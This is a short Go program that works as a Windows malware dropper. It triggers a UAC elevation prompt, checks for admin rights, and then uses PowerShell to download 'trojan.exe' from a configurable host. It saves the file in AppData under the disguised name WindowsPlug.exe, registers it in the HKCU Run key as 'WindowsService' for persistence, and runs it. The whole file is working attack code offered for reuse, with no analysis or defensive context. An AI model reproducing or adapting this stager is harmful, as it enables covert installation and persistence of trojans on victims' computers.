package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows"
)

func main() {

	//Replace IP with the IP or URL where your exe file is
	ipaddr := "192.168.56.1"

	//Replace filename with the name of the file to download
	filename := "trojan.exe"

	if !amAdmin() {
		runMeElevated()

	}
	time.Sleep(10 * time.Second)

	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	//Run Powershell command
	cmd := exec.Command("powershell", "powershell wget "+ipaddr+"/"+filename+" -outfile c:\\users\\$env:USERNAME\\AppData\\Roaming\\WindowsPlug.exe; powershell New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name WindowsService -Value C:\\users\\$env:USERNAME\\AppData\\Roaming\\WindowsPlug.exe; powershell -c C:\\Users\\$env:USERNAME\\AppData\\Roaming\\WindowsPlug.exe")

	//Execute command and get output
	out, err := cmd.Output()

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println(string(out)) //Print output of command
}
func runMeElevated() {
	verb := "runas"
	exe, _ := os.Executable()
	cwd, _ := os.Getwd()
	args := strings.Join(os.Args[1:], " ")

	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
	argPtr, _ := syscall.UTF16PtrFromString(args)

	var showCmd int32 = 1 //SW_NORMAL

	err := windows.ShellExecute(0, verbPtr, exePtr, argPtr, cwdPtr, showCmd)
	if err != nil {
		fmt.Println(err)
	}
}

func amAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		fmt.Println("admin no")
		return false
	}
	fmt.Println("admin yes")
	return true
}
